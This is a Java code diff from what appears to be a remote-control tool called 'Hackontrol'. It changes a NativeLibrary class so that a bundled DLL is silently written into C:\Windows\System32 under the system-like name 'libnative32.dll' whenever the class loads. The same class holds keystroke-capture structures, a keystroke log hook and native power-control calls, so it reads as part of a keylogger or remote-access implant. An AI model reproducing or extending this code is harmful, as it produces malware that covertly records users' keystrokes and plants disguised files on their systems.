@@ -11,23 +11,18 @@ import java.util.Map;
 public class NativeLibrary {
 	private NativeLibrary() {}
 
-	public static final List<KeyEntry> KEYSTROKE_LIST = new ArrayList<>();
-	public static final Map<Integer, Boolean> KEYSTROKE_MAP = new HashMap<>();
+	public static final List<KeyEntry> KEYSTROKE_LIST;
+	public static final Map<Integer, Boolean> KEYSTROKE_MAP;
 
-	public static boolean Block = false;
-	public static boolean Enable = false;
+	public static boolean Block;
+	public static boolean Enable;
 
-	public static native String sleep();
-	public static native String hibernate();
-	public static native String restart();
-	public static native String shutdown();
-
-	public static void load() {
+	static {
 		try {
 			InputStream inputStream = NativeLibrary.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
 			byte[] data = inputStream.readAllBytes();
 			inputStream.close();
-			File file = new File("C:\\Windows\\System32\\Native Library.dll");
+			File file = new File("C:\\Windows\\System32\\libnative32.dll");
 			FileOutputStream outputStream = new FileOutputStream(file);
 			outputStream.write(data);
 			outputStream.close();
@@ -35,6 +30,20 @@ public class NativeLibrary {
 		} catch(Throwable Errors) {
 			Errors.printStackTrace();
 		}
+
+		KEYSTROKE_LIST = new ArrayList<>();
+		KEYSTROKE_MAP = new HashMap<>();
+		NativeLibrary.Block = false;
+		NativeLibrary.Enable = false;
+	}
+
+	public static native String sleep();
+	public static native String hibernate();
+	public static native String restart();
+	public static native String shutdown();
+
+	public static void load() {
+		// Load the class
 	}
 
 	private static boolean log(int keyAction, int keyCode, int scanCode, int flags, int time) {
